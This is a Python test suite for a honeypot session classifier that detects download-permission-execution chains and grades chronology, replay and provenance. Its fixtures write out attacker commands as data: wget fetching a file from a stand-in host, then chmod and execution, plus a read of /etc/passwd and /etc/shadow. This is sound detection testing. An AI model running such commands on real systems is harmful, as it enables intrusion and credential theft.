"""Focused offline contracts for the Phase 4B semantic/replay candidate."""

from __future__ import annotations

import copy
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

from production.classification.classification_pipeline import NotebookParityClassifier
from production.classification.classification_pipeline import split_compound_command
from production.classification.durable_replay import reclassify_durable_prefix
from production.classification.environment import load_classifier_environment
from production.policies.threat_hypothesis_behavior_policy import policy_summary
from production.prediction.evidence_cutoff import validate_evidence_cutoff
from production.prediction.trusted_history import (
    build_prediction_trusted_history_manifest,
    validate_prediction_trusted_history_manifest,
)
from production.reporting.session_assessment_v4 import (
    build_canonical_evidence_snapshot,
    read_legacy_session_assessment,
)
from production.reporting.threat_hypothesis import (
    build_follow_on_hypothesis,
    build_supported_assessment,
)
from production.reporting.typed_semantic_chain_selection import (
    chronology_quality_for_fact_set,
    chronology_quality_for_records,
    select_typed_semantic_chains,
    validate_typed_chain_selection_provenance,
)
from production.reporting.typed_semantic_facts import (
    build_typed_semantic_fact_set,
    build_typed_semantic_provenance,
)
from production.utils.serialization import stable_json
from production.workers.session_monitor import SessionMonitor


ROOT = Path(__file__).resolve().parents[1]
BEHAVIOR_POLICY = ROOT / "configs/threat_hypothesis_behavior.trusted.json"
CLASSIFICATION_POLICY = ROOT / "configs/classification_rules.trusted.json"
CHAIN_RULE = {
    "rule_id": "typed-transfer-permission-execution",
    "required_operation_types": [
        "transfer_attempt",
        "permission_modify",
        "execution_attempt",
    ],
    "minimum_incomplete_operation_count": 2,
}


class _Mitre:
    @staticmethod
    def get_name(ttp: str) -> str:
        return ttp

    @staticmethod
    def get_tactics(ttp: str) -> list[str]:
        return {"T1087.001": ["discovery"], "T1003": ["credential-access"]}.get(
            ttp, ["discovery"]
        )


def _payload(
    case_id: str,
    events: list[tuple[str, str]],
    *,
    timestamps: bool = True,
    cwds: list[str] | None = None,
) -> dict:
    session_id = f"phase4b-{case_id}"
    base = datetime(2026, 8, 26, 0, 0, tzinfo=timezone.utc)
    raw_events = []
    commands = []
    successful = []
    failed = []
    for index, (command, outcome) in enumerate(events):
        eventid = {
            "success": "cowrie.command.success",
            "failure": "cowrie.command.failed",
            "unknown": "cowrie.command.input",
        }[outcome]
        event = {
            "session": session_id,
            "src_ip": "192.0.2.44",
            "eventid": eventid,
            "input": command,
        }
        if timestamps:
            event["timestamp"] = (base + timedelta(seconds=index)).strftime(
                "%Y-%m-%dT%H:%M:%SZ"
            )
        if cwds is not None:
            event["cwd"] = cwds[index]
        if outcome != "unknown":
            event["success"] = int(outcome == "success")
        raw_events.append(event)
        commands.append(command)
        if outcome == "success":
            successful.append(command)
        elif outcome == "failure":
            failed.append(command)
    return {
        "session_id": session_id,
        "src_ip": "192.0.2.44",
        "commands": commands,
        "commands_success": successful,
        "commands_failed": failed,
        "classification_events": [],
        "raw_events": raw_events,
    }


def _typed_context(
    case_id: str,
    events: list[tuple[str, str]],
    *,
    timestamps: bool = True,
    cwds: list[str] | None = None,
) -> tuple[dict, dict, dict, dict, dict]:
    payload = _payload(
        case_id,
        events,
        timestamps=timestamps,
        cwds=cwds,
    )
    snapshot, observed, _source, behavior = build_canonical_evidence_snapshot(
        payload,
        payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
    )
    provenance = build_typed_semantic_provenance(
        snapshot,
        observed_behavior=observed,
        behavior_policy_sha256=policy_summary(
            behavior, include_integrity=True
        )["sha256"],
        classification_policy_sha256=hashlib.sha256(
            CLASSIFICATION_POLICY.read_bytes()
        ).hexdigest(),
        evaluator_git_revision="e833185cb8af41b90a972de9455fae7e42b8b4bf",
    )
    fact_set = build_typed_semantic_fact_set(observed, provenance=provenance)
    return payload, snapshot, observed, behavior, fact_set


def test_th04_chronology_quality_categories_and_propagation() -> None:
    ordered = [
        {"sequence_index": 0, "timestamp": "2026-08-26T00:00:00Z"},
        {"sequence_index": 1, "timestamp": "2026-08-26T00:00:01Z"},
    ]
    assert chronology_quality_for_records(ordered)["quality"] == (
        "timestamp_supported"
    )
    assert chronology_quality_for_records(
        [{"sequence_index": 0}, {"sequence_index": 1}]
    )["quality"] == "fallback_input_order"
    assert chronology_quality_for_records(
        [{"sequence_index": 0, "timestamp": "2026-08-26T00:00:00Z"}, {"sequence_index": 1}]
    )["quality"] == "mixed_timestamp"
    assert chronology_quality_for_records(
        [{"sequence_index": 0, "timestamp": "not-a-timestamp"}]
    )["quality"] == "malformed_timestamp"
    assert chronology_quality_for_records(
        [
            {"sequence_index": 0, "timestamp": "2026-08-26T00:00:02Z"},
            {"sequence_index": 1, "timestamp": "2026-08-26T00:00:01Z"},
        ]
    )["quality"] == "contradictory_timestamp"
    missing = [{"value": "a"}, {"value": "b"}]
    assert chronology_quality_for_records(missing) == chronology_quality_for_records(
        copy.deepcopy(missing)
    )

    _payload_value, _snapshot, observed, behavior, fact_set = _typed_context(
        "th04-propagation",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    )
    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
    assert chronology_quality_for_fact_set(fact_set)["quality"] == (
        "timestamp_supported"
    )
    assert selection["matches"][0]["chronology_quality"] == "timestamp_supported"
    supported = build_supported_assessment(
        observed,
        behavior_policy_document=behavior,
        typed_semantic_fact_set=fact_set,
        activated_semantic_families=(
            "sensitive_read",
            "transfer",
            "transfer_attempt",
            "inspection",
            "filesystem",
            "execution",
        ),
    )
    typed_claim = next(
        claim
        for claim in supported["connected_behavior_claims"]
        if claim.get("claim_basis") == "typed_semantic_chain_selection.v2"
    )
    assert typed_claim["chronology_quality"] == "timestamp_supported"


def test_th04_durable_replay_uses_received_at_when_event_timestamp_missing() -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=_Mitre())
    event = {
        "eventid": "cowrie.command.input",
        "session": "phase4b-replay-time",
        "input": "id",
    }
    received_at = "2026-08-26T00:00:00.000000+00:00"
    entry = {
        "event_id": "event-0",
        "received_at": received_at,
        "payload_sha256": hashlib.sha256(stable_json(event).encode()).hexdigest(),
    }
    basis = {
        "schema_version": "durable_session_event_manifest.v1",
        "session_id": "phase4b-replay-time",
        "through_event_id": "event-0",
        "through_received_at": received_at,
        "event_entries": [entry],
    }
    snapshot = {
        **basis,
        "event_count": 1,
        "manifest_sha256": hashlib.sha256(stable_json(basis).encode()).hexdigest(),
        "events": [event],
    }
    replay = reclassify_durable_prefix(
        {"session_id": "phase4b-replay-time", "classification_events": []},
        snapshot,
        classifier,
        load_classifier_environment(),
    )
    assert replay["classification_replay"]["chronology_quality"] == (
        "timestamp_supported"
    )


def test_th05_derivation_is_bounded_and_authorization_is_denied() -> None:
    _payload_value, _snapshot, observed, behavior, fact_set = _typed_context(
        "th05-complete",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    )
    supported = build_supported_assessment(
        observed,
        behavior_policy_document=behavior,
        typed_semantic_fact_set=fact_set,
        activated_semantic_families=(
            "sensitive_read",
            "transfer",
            "transfer_attempt",
            "inspection",
            "filesystem",
            "execution",
        ),
    )
    claim = next(
        claim
        for claim in supported["connected_behavior_claims"]
        if claim.get("claim_basis") == "typed_semantic_chain_selection.v2"
    )
    assert claim["hypothesis_authority"] == {
        "may_derive_hypotheses": True,
        "may_render_hypotheses": True,
        "may_select_authoritative_hypothesis": False,
        "may_authorize_response": False,
    }
    assert claim["hypothesis_authority"]["may_select_authoritative_hypothesis"] is False
    assert claim["hypothesis_authority"]["may_authorize_response"] is False

    incomplete_context = _typed_context(
        "th05-incomplete",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
        ],
    )
    follow_on = build_follow_on_hypothesis(
        incomplete_context[2],
        behavior_policy_document=incomplete_context[3],
        typed_semantic_fact_set=incomplete_context[4],
    )
    assert follow_on["claims"]
    assert all(
        claim["hypothesis_authority"]["may_authorize_response"] is False
        for claim in follow_on["claims"]
    )
    unsupported = build_follow_on_hypothesis(
        _typed_context("th05-unsupported", [("echo hello", "success")])[2],
        behavior_policy_document=behavior,
        typed_semantic_fact_set=_typed_context(
            "th05-unsupported-facts", [("echo hello", "success")]
        )[4],
    )
    assert unsupported["claims"] == []
    assert unsupported["abstained"] is True


def test_th05_malformed_or_missing_authority_metadata_abstains() -> None:
    context = _typed_context(
        "th05-malformed",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
        ],
    )
    for mutate in ("remove", "select_true"):
        policy = copy.deepcopy(context[3])
        metadata = policy["policy"]["claims"]["authority_boundary"][
            "hypothesis_authority"
        ]
        if mutate == "remove":
            del policy["policy"]["claims"]["authority_boundary"][
                "hypothesis_authority"
            ]
        else:
            metadata["may_select_authoritative_hypothesis"] = True
        result = build_follow_on_hypothesis(
            context[2],
            behavior_policy_document=policy,
            typed_semantic_fact_set=context[4],
        )
        assert result["claims"] == []
        assert result["abstained"] is True
        assert any(
            token in result["abstention_reason"]
            for token in ("metadata", "authorization", "selection")
        )

    report = build_supported_assessment(
        context[2],
        behavior_policy_document=context[3],
        typed_semantic_fact_set=context[4],
        activated_semantic_families=(
            "sensitive_read",
            "transfer",
            "transfer_attempt",
            "inspection",
            "filesystem",
            "execution",
        ),
    )
    assert report["typed_chain_selection"]["authority"][
        "may_authorize_response"
    ] is False


def test_th06_current_v2_provenance_supported_and_incomplete() -> None:
    complete = _typed_context(
        "th06-complete",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    )
    selection = select_typed_semantic_chains(complete[4], [CHAIN_RULE])
    assert validate_typed_chain_selection_provenance(
        selection, selection["matches"][0], expected_status="complete"
    ) == []
    supported = build_supported_assessment(
        complete[2],
        behavior_policy_document=complete[3],
        typed_semantic_fact_set=complete[4],
        activated_semantic_families=(
            "sensitive_read",
            "transfer",
            "transfer_attempt",
            "inspection",
            "filesystem",
            "execution",
        ),
    )
    complete_claim = next(
        claim
        for claim in supported["connected_behavior_claims"]
        if claim.get("claim_basis") == "typed_semantic_chain_selection.v2"
    )
    assert complete_claim["selector_provenance"]["schema_version"] == (
        "typed_semantic_chain_selection.v2"
    )

    incomplete = _typed_context(
        "th06-incomplete",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
        ],
    )
    incomplete_selection = select_typed_semantic_chains(incomplete[4], [CHAIN_RULE])
    incomplete_match = incomplete_selection["matches"][0]
    assert incomplete_match["status"] == "incomplete"
    assert validate_typed_chain_selection_provenance(
        incomplete_selection, incomplete_match, expected_status="incomplete"
    ) == []
    follow_on = build_follow_on_hypothesis(
        incomplete[2],
        behavior_policy_document=incomplete[3],
        typed_semantic_fact_set=incomplete[4],
    )
    assert follow_on["claims"][0]["claim_basis"] == (
        "typed_semantic_chain_selection.v2"
    )
    assert follow_on["claims"][0]["selector_provenance"]["schema_version"] == (
        "typed_semantic_chain_selection.v2"
    )


def test_th06_malformed_unknown_and_legacy_read_only_provenance() -> None:
    context = _typed_context(
        "th06-provenance",
        [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    )
    selection = select_typed_semantic_chains(context[4], [CHAIN_RULE])
    malformed = copy.deepcopy(selection)
    malformed["matches"][0]["selector_provenance"]["status"] = "unknown"
    assert validate_typed_chain_selection_provenance(
        malformed, malformed["matches"][0], expected_status="complete"
    )
    unknown = copy.deepcopy(selection)
    unknown["schema_version"] = "typed_semantic_chain_selection.v9"
    assert validate_typed_chain_selection_provenance(
        unknown, unknown["matches"][0], expected_status="complete"
    )

    historical = {
        "schema_version": "session_assessment.v4",
        "claim_basis": "typed_semantic_chain_selection.v1",
        "behavioral_findings": [],
    }
    original = copy.deepcopy(historical)
    adapter = read_legacy_session_assessment(historical)
    assert adapter["status"] == "legacy_read_only"
    assert adapter["recomputed"] is False
    assert historical == original


def test_replay01_realtime_and_durable_replay_have_one_multilabel_phase() -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=_Mitre())
    event = {
        "eventid": "cowrie.command.input",
        "session": "phase4b-multilabel",
        "src_ip": "203.0.113.20",
        "timestamp": "2026-08-26T00:00:00Z",
        "input": "cat /etc/passwd /etc/shadow",
    }
    monitor = SessionMonitor(
        mitre_db=_Mitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    cutoff = {
        "schema_version": "prediction_evidence_cutoff.v1",
        "received_at": "2026-08-26T00:00:00.000000+00:00",
        "event_id": "event-0",
    }
    monitor.on_event(event, durable_evidence_order=cutoff)
    realtime = monitor.get_session("phase4b-multilabel")
    assert realtime is not None
    assert len(realtime.prediction_trusted_history) == 1
    assert len(realtime.prediction_trusted_history[0]["labels"]) == 2
    assert realtime.prediction_trusted_history[0]["evidence_refs"] == ["event-0"]

    # Preserve the same event timestamp in the replay fixture so parity tests
    # compare the complete V3 phase representation.  The separate TH04 test
    # above covers the durable ``received_at`` fallback when it is absent.
    replay_event = dict(event)
    replay_entry = {
        "event_id": "event-0",
        "received_at": cutoff["received_at"],
        "payload_sha256": hashlib.sha256(
            stable_json(replay_event).encode()
        ).hexdigest(),
    }
    replay_basis = {
        "schema_version": "durable_session_event_manifest.v1",
        "session_id": "phase4b-multilabel",
        "through_event_id": "event-0",
        "through_received_at": cutoff["received_at"],
        "event_entries": [replay_entry],
    }
    replay_snapshot = {
        **replay_basis,
        "event_count": 1,
        "manifest_sha256": hashlib.sha256(
            stable_json(replay_basis).encode()
        ).hexdigest(),
        "events": [replay_event],
    }
    replay = reclassify_durable_prefix(
        {"session_id": "phase4b-multilabel", "classification_events": []},
        replay_snapshot,
        classifier,
        load_classifier_environment(),
    )
    phase = replay["prediction_trusted_history"][0]
    assert len(replay["prediction_trusted_history"]) == 1
    assert len(phase["labels"]) == 2
    assert phase["evidence_refs"] == ["event-0"]
    replay_manifest = replay["prediction_trusted_history_manifest"]
    realtime_manifest = build_prediction_trusted_history_manifest(
        phases=realtime.prediction_trusted_history,
        evidence_cutoff=cutoff,
        classifier_environment=load_classifier_environment(),
    )
    assert replay_manifest["ordered_trusted_phases"] == realtime_manifest[
        "ordered_trusted_phases"
    ]


def test_replay03_current_selector_v2_and_historical_v3_reference_is_not_producer() -> None:
    selector_source = (
        ROOT / "production/reporting/typed_semantic_chain_selection.py"
    ).read_text(encoding="utf-8")
    assert "SCHEMA_VERSION = \"typed_semantic_chain_selection.v2\"" in selector_source
    assert "typed_semantic_chain_selection.v3" not in selector_source
    historical_source = (
        ROOT / "production/reporting/session_assessment_v5.py"
    ).read_text(encoding="utf-8")
    assert "typed_semantic_chain_selection.v3" in historical_source


def test_replay04_confirmed_cwd_resolves_only_safe_literal_paths() -> None:
    positive = _typed_context(
        "replay04-positive",
        [
            ("cd /tmp", "success"),
            ("wget https://example.invalid/a -O a.sh", "success"),
            ("chmod 700 a.sh", "success"),
            ("./a.sh", "success"),
        ],
    )
    selected = select_typed_semantic_chains(positive[4], [CHAIN_RULE])
    assert [match["status"] for match in selected["matches"]] == ["complete"]
    path_values = {
        resolution["candidate_normalized_value"]
        for fact in positive[4]["facts"]
        for resolution in fact["path_resolutions"]
        if resolution["role"] in {"destination_paths", "modified_paths", "executed_paths"}
    }
    assert "/tmp/a.sh" in path_values
    assert all(
        fact["outcome"]["status"] == "reported_success"
        for fact in positive[4]["facts"]
        if fact["shell_context"]["command"] != "cd /tmp"
    )

    negative_cases = [
        ("replay04-no-cwd", [("wget https://example.invalid/a -O a.sh", "success"), ("chmod 700 a.sh", "success"), ("./a.sh", "success")], None),
        ("replay04-failed-cwd", [("cd /tmp", "failure"), ("wget https://example.invalid/a -O a.sh", "success"), ("chmod 700 a.sh", "success"), ("./a.sh", "success")], None),
        ("replay04-dynamic-cwd", [("cd $TARGET", "success"), ("wget https://example.invalid/a -O a.sh", "success"), ("chmod 700 a.sh", "success"), ("./a.sh", "success")], None),
        ("replay04-ambiguous-cwd", [("cd /tmp /var", "success"), ("wget https://example.invalid/a -O a.sh", "success"), ("chmod 700 a.sh", "success"), ("./a.sh", "success")], None),
        ("replay04-traversal", [("cd /tmp", "success"), ("wget https://example.invalid/a -O ../a.sh", "success"), ("chmod 700 ../a.sh", "success"), ("../a.sh", "success")], None),
        ("replay04-cwd-after", [("wget https://example.invalid/a -O a.sh", "success"), ("cd /tmp", "success"), ("chmod 700 a.sh", "success"), ("./a.sh", "success")], None),
        ("replay04-different-basename", [("wget https://example.invalid/a -O /tmp/a.sh", "success"), ("chmod 700 /var/a.sh", "success"), ("/var/a.sh", "success")], None),
    ]
    for case_id, events, _ in negative_cases:
        context = _typed_context(case_id, events)
        assert select_typed_semantic_chains(context[4], [CHAIN_RULE])["matches"] == []

    cwd_mismatch = _typed_context(
        "replay04-cwd-mismatch",
        [
            ("wget https://example.invalid/a -O a.sh", "success"),
            ("chmod 700 a.sh", "success"),
            ("./a.sh", "success"),
        ],
        cwds=["/tmp", "/var", "/var"],
    )
    assert select_typed_semantic_chains(cwd_mismatch[4], [CHAIN_RULE])["matches"] == []

    failed_execution = _typed_context(
        "replay04-failed-execution",
        [
            ("cd /tmp", "success"),
            ("wget https://example.invalid/a -O a.sh", "success"),
            ("chmod 700 a.sh", "success"),
            ("./a.sh", "failure"),
        ],
    )
    assert "/tmp/a.sh" in {
        resolution["candidate_normalized_value"]
        for fact in failed_execution[4]["facts"]
        for resolution in fact["path_resolutions"]
    }
    assert select_typed_semantic_chains(failed_execution[4], [CHAIN_RULE])["matches"] == []


def test_replay05_nonimplementation_guard() -> None:
    selector = (
        ROOT / "production/reporting/typed_semantic_chain_selection.py"
    ).read_text(encoding="utf-8")
    for forbidden in (
        "retry_window",
        "max_retries",
        "subsequence_retry",
        "search_horizon",
        "retry_budget",
    ):
        assert forbidden not in selector
    assert split_compound_command("cd /tmp; ./a.sh")
